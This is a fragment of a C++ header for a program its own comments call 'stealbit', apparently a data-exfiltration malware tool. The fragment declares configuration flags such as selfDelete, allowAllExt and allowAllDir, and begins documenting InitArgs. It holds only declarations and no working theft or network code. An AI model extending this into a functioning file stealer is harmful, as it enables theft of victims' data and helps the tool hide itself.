...
namespace arguments {
    extern std::string sbFileName;
    extern std::string startingPoint;
    extern bool selfDelete;
    extern bool allowAllExt;
    extern bool allowAllDir;
    extern long fileSize;

    /*
     * InitArgs:
     *      About:
     *          Captures and initializes all arguments passed to stealbit
     *      Result:
     *          sets flags and values that determine how stealbit operates
     *      Returns:
     *          void
